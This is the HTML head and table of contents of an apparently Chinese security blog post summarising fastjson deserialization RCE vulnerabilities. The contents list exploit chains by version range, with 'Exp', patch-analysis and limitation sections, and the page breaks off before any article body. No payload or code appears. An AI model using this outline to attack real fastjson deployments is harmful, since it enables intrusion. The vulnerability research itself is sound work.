<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言fastjson是阿里巴巴旗下的一个Java库，用于Java对象和JSON字符串之间的转换。这个库从2017-2022年，陆陆续续爆出了20多个反序列化RCE。官方采用黑名单的方式修复漏洞，这导致出现一系列的bypass&#x3D; &#x3D; 序列化分析123456789101112131415161718192021222324252627282930313233343536373839">
<meta property="og:type" content="article">
<meta property="og:title" content="fastjson反序列化总结 TODO">
<meta property="og:url" content="https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/index.html">
<meta property="og:site_name" content="Jasper_sec">
<meta property="og:description" content="前言fastjson是阿里巴巴旗下的一个Java库，用于Java对象和JSON字符串之间的转换。这个库从2017-2022年，陆陆续续爆出了20多个反序列化RCE。官方采用黑名单的方式修复漏洞，这导致出现一系列的bypass&#x3D; &#x3D; 序列化分析123456789101112131415161718192021222324252627282930313233343536373839">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698293500707-b0e4f3dc-81e8-4de1-8ff1-e10572a1a178.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698300347029-ae57f17f-9046-4224-9bdb-bac7424c4f31.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698300741065-e554dae6-0de1-450a-ac5e-64eda9222170.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698390119436-4d5e6377-6486-4a54-87a9-ffaf6d596238.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698390350055-073de250-31ec-43c4-9eed-c4adc8364e2c.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698404119899-9ea4ec6b-bbf4-44c8-8fec-16444eb44d0a.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698404743852-cea4a5cc-dab9-43d3-b0aa-ff7f23a7f33c.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698418921724-c390b176-b81c-4402-9b3c-574351c6042d.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698405744528-716355e9-7545-4a51-889b-f5750dcab5fa.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698405588482-9209f38e-9327-474e-815d-746f019f82f3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698408678972-84dfc6c8-4cbe-450f-805c-9a3c8c8808e7.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698422368971-6be86174-3e37-4d35-a58d-e2e5060b0ae0.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698423729449-9b5047c8-bcc1-4bc7-90f7-eb385875c1df.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698423846048-563056cc-bb62-4197-8462-710029dc5506.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698717429189-80eeaf7e-d424-4e20-b2f1-af9118a4f559.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698717639728-09e39775-2594-459c-8063-e9e721548432.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698717888684-0a64b119-f142-4a87-b20c-faa93e50245f.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698738981491-d537178e-29e0-44cf-92a7-b3eceaefe83a.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698741593872-0a380d67-9006-453d-9996-57d06b6c5425.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742254326-a6235a77-e215-4f46-9daf-68504a33f1f8.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742295676-8f87c893-ebda-4c6f-adcf-46825313086d.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742671061-892d31eb-edcf-466c-97f4-9a1054ca50cb.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742892048-e05e79dc-4787-48fe-a561-02a766cbe790.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698743073506-9a513a40-2c3b-40ac-bc61-1d8f45996c5f.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698743639941-33ddd478-84c1-4147-8283-d6697f1802a5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750115778-9544d540-76ae-481b-8de6-12b1f83eace5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750540577-417e8113-7cae-400b-87bf-157dc1928e47.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750783181-80234dfa-4312-4646-8af5-08d8dfac3c85.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750971771-b5591e83-9bae-43d8-b3a5-03d6786f6a92.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698751620126-5769e711-7bd5-4fb3-af05-f324f2792e50.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698751825640-0d6820b6-fbbe-485c-9895-3b0268173a82.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698753142868-78aa3c22-d35c-4f9a-9030-99737647af46.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770139713-0b121b72-5cbe-4ece-b9ab-28e669fe6907.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770252631-4cf12606-07b4-42e9-92da-3c3be5ff6c36.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770549079-a7405030-6f34-4993-b522-2174c04fe139.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770901140-a93fb0f3-e0ba-40ed-85e1-2def8daf9f80.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698771019637-d465aa1b-b99b-42d8-be01-4b2a062031fe.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698771218994-927e40d4-50fc-49c6-b567-109923a3f4ea.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698771618187-1ebf6032-7321-4c9e-90db-6a2569b671c5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698773169563-8ef49b85-8255-4c14-a61f-4c09a543679e.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698772581287-ec1ff9d6-5155-4356-b9a4-fb8cfb0a956a.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698772695940-0e69df38-a016-4cb2-ad75-21d76ca6205a.png">
<meta property="article:published_time" content="2023-12-24T04:32:20.000Z">
<meta property="article:modified_time" content="2023-12-25T06:42:40.362Z">
<meta property="article:author" content="Jasper_sec">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="Fastjson">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698293500707-b0e4f3dc-81e8-4de1-8ff1-e10572a1a178.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>fastjson反序列化总结 TODO</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/12/24/0x0B%20JNDI%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&text=fastjson反序列化总结 TODO"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&title=fastjson反序列化总结 TODO"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&is_video=false&description=fastjson反序列化总结 TODO"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=fastjson反序列化总结 TODO&body=Check out this article: https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&title=fastjson反序列化总结 TODO"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&title=fastjson反序列化总结 TODO"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&title=fastjson反序列化总结 TODO"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&title=fastjson反序列化总结 TODO"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&name=fastjson反序列化总结 TODO&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&t=fastjson反序列化总结 TODO"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">序列化分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E8%B0%83getter"><span class="toc-number">2.1.</span> <span class="toc-text">为什么会调getter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0JSON%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-number">2.2.</span> <span class="toc-text">构造JSON字符串的地方</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">反序列化分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A0%B9%E6%8D%AEJSON%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B0%81%E8%A3%85deserializer"><span class="toc-number">3.1.</span> <span class="toc-text">1.根据JSON字符串封装deserializer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%B0%83%E7%94%A8deserializer-deserialize%E5%88%9B%E5%BB%BA%E5%B9%B6%E5%88%9D%E5%A7%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.2.</span> <span class="toc-text">2.调用deserializer#deserialize创建并初始化对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#parse%E5%92%8CparseObject%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.3.</span> <span class="toc-text">parse和parseObject的区别</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-22-1-2-24"><span class="toc-number">4.</span> <span class="toc-text">1.2.22-1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatsImpl%E9%93%BE"><span class="toc-number">4.1.</span> <span class="toc-text">TemplatsImpl链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">4.1.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%BA%E7%82%B9"><span class="toc-number">4.1.2.</span> <span class="toc-text">缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8A%A0-type%E6%8C%87%E5%AE%9A%E5%85%A8%E7%B1%BB%E5%90%8D"><span class="toc-number">4.1.3.</span> <span class="toc-text">为什么加@type指定全类名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88parse%E8%A6%81%E5%8A%A0Feature%E5%8F%82%E6%95%B0"><span class="toc-number">4.1.4.</span> <span class="toc-text">为什么parse要加Feature参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-bytecodes%E8%A6%81base64%E7%BC%96%E7%A0%81"><span class="toc-number">4.1.5.</span> <span class="toc-text">为什么_bytecodes要base64编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E8%A7%A6%E5%8F%91getOutputProperties"><span class="toc-number">4.1.6.</span> <span class="toc-text">为什么会触发getOutputProperties</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JdbcRowSetImpl%E9%93%BE"><span class="toc-number">4.2.</span> <span class="toc-text">JdbcRowSetImpl链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%BA%E7%82%B9-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">4.2.3.</span> <span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AFDataSourceName%E8%80%8C%E4%B8%8D%E6%98%AFdataSource"><span class="toc-number">4.2.4.</span> <span class="toc-text">为什么是DataSourceName而不是dataSource</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-41"><span class="toc-number">5.</span> <span class="toc-text">1.2.25-1.2.41</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">5.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number">5.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6"><span class="toc-number">5.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">5.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-42"><span class="toc-number">6.</span> <span class="toc-text">1.2.25-1.2.42</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-1"><span class="toc-number">6.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-1"><span class="toc-number">6.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-1"><span class="toc-number">6.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1"><span class="toc-number">6.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-43"><span class="toc-number">7.</span> <span class="toc-text">1.2.25-1.2.43</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-2"><span class="toc-number">7.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-2"><span class="toc-number">7.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-2"><span class="toc-number">7.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-2"><span class="toc-number">7.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-45"><span class="toc-number">8.</span> <span class="toc-text">1.2.25-1.2.45</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-3"><span class="toc-number">8.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-3"><span class="toc-number">8.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-3"><span class="toc-number">8.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-3"><span class="toc-number">8.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-47"><span class="toc-number">9.</span> <span class="toc-text">1.2.25-1.2.47</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-4"><span class="toc-number">9.1.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-4"><span class="toc-number">9.2.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-4"><span class="toc-number">9.3.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-59"><span class="toc-number">10.</span> <span class="toc-text">1.2.25-1.2.59</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">10.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-5"><span class="toc-number">10.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-5"><span class="toc-number">10.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-5"><span class="toc-number">10.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-61%EF%BC%88%E5%A4%8D%E7%8E%B0%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-number">11.</span> <span class="toc-text">1.2.25-1.2.61（复现失败）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">11.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-6"><span class="toc-number">11.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-6"><span class="toc-number">11.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-6"><span class="toc-number">11.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-62"><span class="toc-number">12.</span> <span class="toc-text">1.2.25-1.2.62</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JndiConverter%E9%93%BE"><span class="toc-number">12.1.</span> <span class="toc-text">JndiConverter链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-4"><span class="toc-number">12.1.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-7"><span class="toc-number">12.1.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-7"><span class="toc-number">12.1.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-7"><span class="toc-number">12.1.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CocoonSlide%E9%93%BE"><span class="toc-number">12.2.</span> <span class="toc-text">CocoonSlide链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-5"><span class="toc-number">12.2.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-8"><span class="toc-number">12.2.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-8"><span class="toc-number">12.2.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-8"><span class="toc-number">12.2.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-66"><span class="toc-number">13.</span> <span class="toc-text">1.2.25-1.2.66</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shiro%E9%93%BE"><span class="toc-number">13.1.</span> <span class="toc-text">shiro链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">13.1.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-9"><span class="toc-number">13.1.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-9"><span class="toc-number">13.1.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-9"><span class="toc-number">13.1.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#anteros%E9%93%BE"><span class="toc-number">13.2.</span> <span class="toc-text">anteros链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="toc-number">13.2.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-10"><span class="toc-number">13.2.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-10"><span class="toc-number">13.2.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-10"><span class="toc-number">13.2.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IbatisSqlmap%E9%93%BE"><span class="toc-number">13.3.</span> <span class="toc-text">IbatisSqlmap链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4"><span class="toc-number">13.3.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-11"><span 